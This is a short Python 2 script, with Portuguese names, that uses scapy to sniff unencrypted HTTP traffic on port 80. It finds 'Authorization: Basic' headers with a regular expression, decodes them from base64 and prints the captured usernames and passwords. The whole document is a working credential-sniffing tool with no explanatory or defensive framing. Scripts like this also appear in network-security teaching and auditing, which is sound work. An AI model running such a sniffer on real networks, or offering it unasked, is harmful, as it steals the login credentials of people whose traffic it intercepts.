from scapy.all import *
import re, base64
pattern = re.compile(r"Authorization: Basic (.+)")
def pacote_callback(pacote):
    if pacote[TCP].payload:
        payload = str(pacote[TCP].payload)
        match = re.search(pattern, payload)
        if match:
            print base64.b64decode(match.group(1))
            print "*" * 10
sniff(filter="tcp port 80", prn=pacote_callback, store=0)